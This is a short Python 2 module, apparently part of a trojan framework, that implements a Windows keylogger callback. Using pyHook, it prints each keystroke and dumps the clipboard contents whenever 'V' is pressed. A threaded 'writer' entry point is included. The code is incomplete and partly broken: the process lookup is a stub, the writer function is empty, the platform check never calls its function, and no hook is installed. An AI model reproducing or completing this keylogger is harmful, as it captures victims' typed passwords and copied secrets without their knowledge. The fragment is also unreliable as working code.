import os
import platform
import threading
from ctypes import *
import pythoncom
import pyHook
import win32clipboard


def get_current_process():
    pass


def WinKeyStroke(event):
    global current_window

    if event.WindowName != current_window:
        current_window = event.WindowName
        get_current_process()

    if event.Ascii > 32 and event.Ascii < 127:
        print chr(event.Ascii),
    else:
        if event.Key == "V":
            win32clipboard.OpenClipboard()
            pasted_value = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            print "[PASTE] - %s" % pasted_value
        else:
            print "[%s]" % event.Key,

    return True


def main_writer():
    print("MAIN WRITER !!!")

    if platform.system == "Windows":
        pass


def run(**args):
    print "[*] In writer module."
    if args['thread']:
        return

    args['thread'] = threading.Thread(target=main_writer)
    args['thread'].start()

    return
